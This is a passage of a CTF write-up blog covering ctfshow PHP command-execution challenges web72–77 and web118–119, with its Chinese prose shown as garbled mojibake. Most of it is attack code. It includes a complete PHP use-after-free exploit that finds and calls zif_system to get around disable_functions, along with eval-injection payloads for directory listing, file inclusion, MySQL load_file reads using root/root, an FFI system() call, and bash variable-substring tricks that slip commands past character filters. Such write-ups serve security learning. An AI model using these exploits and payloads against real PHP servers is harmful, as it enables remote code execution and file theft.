leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#ÈúÄË¶ÅÈÄöËøáurlÁºñÁ†ÅÂì¶</span></span><br></pre></td></tr></table></figure><p>ÈÄöËøáburpsuiteÊäìÂåÖÔºåÁÑ∂ÂêéÊääpostÁöÑcÊõøÊç¢ÊàêexpÔºåÊé•ÁùÄÊåâÁÖßÂõæ‰∏≠ÊâÄÁ§∫Ê≠•È™§ËøõË°åurlÁºñÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/QY87%60Y%6055E%29Y_VI_AVTW294.png" alt=""><br>ÂèëÈÄÅÊï∞ÊçÆÂåÖÂêéÂèØËé∑Âæóflag</p><h3 id="web73"><a class="header-anchor" href="#web73">¬∂</a>web73</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËÄÅËßÑÁü©ÔºåÂÖàÁúãÁõÆÂΩïÔºåËÇØÂÆöÂèàÊîπÂêç‰∫Ü</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>ÊûúÁÑ∂ÔºåflagÊñá‰ª∂Áé∞Âú®ÊòØflagc.txtÔºåÂÖàÂ∞ùËØïËÉΩ‰∏çËÉΩËØªÂèñÔºåÂ•ΩÂÆ∂‰ºôÔºåËÉΩÁõ¥Êé•ËØªÂèñÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h3 id="web74"><a class="header-anchor" href="#web74">¬∂</a>web74</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êü•ÁúãÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°flagÂú®flagx.txtÈáåÔºåpaylaodÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h3 id="web75"><a class="header-anchor" href="#web75">¬∂</a>web75</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êü•ÁúãÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°flagÂú®flag36.txtÈáåÔºåÂ•ΩÂÆ∂‰ºôÂèàËØªÂèñ‰∏çÊàêÂäüÂºÄÂßãÈôêÂà∂‰∫ÜÔºåÂêéÊù•Áúã‰∫Ü‰∏ãhintÔºåËøôÈ¢òÁî®ÁöÑmysqlÁöÑload_fileËøõË°åËØªÂèñÊñá‰ª∂ÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>ËøòÊòØÂú®burpsuite‰∏≠ËøõË°åurlÁºñÁ†ÅÂêéÂèëÂåÖÊãøÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web75/0W2_V3__ZICVWGSHCN53GJF.png" alt=""></p><h3 id="web76"><a class="header-anchor" href="#web76">¬∂</a>web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êü•ÁúãÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂèëÁé∞flagÂú®flag36d.txt‰∏≠ÔºåËøòÊòØ‰∏äÈ¢òËÄÅÂ•óË∑ØÔºåÁî®load_fileËØªÂèñÊñá‰ª∂Ôºåpaylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36d.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>ËÆ∞ÂæóËøõË°åurlÁºñÁ†ÅÔºåÂèëÂåÖÂêéÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web76/F%24%40QVT1OP_H%604N%29VZF_%28T37.png" alt=""></p><h3 id="web77"><a class="header-anchor" href="#web77">¬∂</a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁªßÁª≠ËØªÂèñÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/S6%25~_S%60_K%40WD%60%25WFTJ%5BKK%7BN.png" alt=""><br>ÂèëÁé∞‰∏Ä‰∏™flag36x.txtÂíåreadflagÔºåÈ¢òÁõÆÊèêÁ§∫‰∫Üphp7.4ÔºåÊêú‰∫Ü‰∏Ä‰∏ãÊòØÂà©Áî®FF1ÊãìÂ±ï(php7.4ÂºÄÂßãÊâçÊúâ)ÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;&#x2F;readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure><p>ËøôÈáåflag36x.txtËØªÂèñ‰∏çÂá∫Êù•Ê≤°ÊúâÂõûÊòæÔºåÊâÄ‰ª•Âà©Áî®readflagÈÇ£‰∏™Êñá‰ª∂ÔºåÊää‰ªñËæìÂá∫Âà∞Êñ∞Êñá‰ª∂flag.txt‰∏≠<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/6A6%7DHTF3SLM%7D7%40C~F%5DY0LLE.png" alt=""><br>Êé•ÁùÄËÆøÈóÆflag.txtÂ∞±ÂèØ‰ª•Ëé∑Âæóflag‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/ONRI4J8%29WFX9K8%40_%257S%5BFA4.png" alt=""></p><h3 id="web118"><a class="header-anchor" href="#web118">¬∂</a>web118</h3><p>È¢òÁõÆÊèêÁ§∫flagÂú®flag.php‰∏≠ÔºåÊâìÂºÄÈ°µÈù¢ÔºåÊúâ‰∏Ä‰∏™ËæìÂÖ•Ê°Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÊèêÁ§∫ÊòØ:<code>system($code);</code>ÔºåfuzzÂ∞ùËØï‰πãÂêéÂèëÁé∞Âè™ÊúâÂ§ßÂÜôÂ≠óÊØçÂíå${}:?.~Á≠âÁ≠âÂ≠óÁ¨¶ÂèØ‰ª•ÈÄöËøáÔºåÂèØ‰ª•‰ΩøÁî®bashÂÜÖÁΩÆÂèòÈáèËøõË°åÂà©Áî®<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/CIVB%240HL%7B%5B%5D%29X_%5B_8S8_AT8.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PWD&#125; </span><br><span class="line">&#x2F;root</span><br><span class="line">                                                                                                      </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PWD:0:1&#125;      #Ë°®Á§∫‰ªé0‰∏ãÊ†áÂºÄÂßãÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶</span><br><span class="line">&#x2F;                                                                                                                                                                                       </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PWD:~0:1&#125;      #‰ªéÁªìÂ∞æÂºÄÂßãÂæÄÂâçÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶</span><br><span class="line">t</span><br><span class="line">                                                                                </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line">                                                                             </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PWD:~A&#125;       #ÊâÄ‰ª•Â≠óÊØçÂíå0ÂÖ∑ÊúâÂêåÊ†∑‰ΩúÁî®             </span><br><span class="line">t</span><br><span class="line">                                                                    </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PATH&#125;                            </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">                                                                    </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# echo $&#123;PATH:~A&#125;                </span><br><span class="line">n</span><br><span class="line">                                                                                                    </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# ls                                      </span><br><span class="line">Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos</span><br><span class="line">                                                                                              </span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]</span><br><span class="line">‚îî‚îÄ# $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br><span class="line">                    </span><br></pre></td></tr></table></figure><p>‰ªé‰∏≠ÂèëÁé∞Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†Âá∫nlÂëΩ‰ª§ËøõË°åËØªÂèñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;PATH&#125;</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line"></span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">ÊâÄ‰ª•payload‰∏∫</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>ÁÑ∂ÂêéÂè≥ÈîÆÊ∫êÁ†ÅÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/T%5DH9NIZHXVX%5BQ8R%24FVBF~6B.png" alt=""></p><h3 id="web119"><a class="header-anchor" href="#web119">¬∂</a>web119</h3><p>ËøôÊ¨°Âú®ÂâçÈù¢ÁöÑÂü∫Á°Ä‰∏äÊääpathÁªôÁ¶Å‰∫ÜÔºå‰πüÂ∞±ÊòØÊàë‰ª¨Êó†Ê≥ïËé∑ÂæónËøô‰∏™Â≠óÊØçÔºå‰πüÂ∞±Êó†Ê≥ïÊûÑÊàê‰∫ÜnlÂëΩ‰ª§„ÄÇÊé•‰∏ãÊù•Êàë‰ª¨Â∞ùËØïÊûÑÈÄ†‰∏Ä‰∏ã<code>/bin/cat</code>ÔºåËÄåÊÉ≥Ë¶ÅÂåπÈÖçÂà∞Êàë‰ª¨Ëá≥Â∞ëÈúÄË¶Å‰∏Ä‰∏™<code>/</code>Á¨¶Âè∑Âíå‰∏Ä‰∏™<code>cat</code>‰∏≠ÁöÑ‰∏Ä‰∏™Â≠óÊØçÔºåËøôÈáå‰ΩøÁî®<code>$&#123;SHLVL&#125;</code>Êù•ÈÖçÂêàÊûÑÈÄ†<code>/</code></p><blockquote><p>SHLVL ÊòØËÆ∞ÂΩïÂ§ö‰∏™ Bash 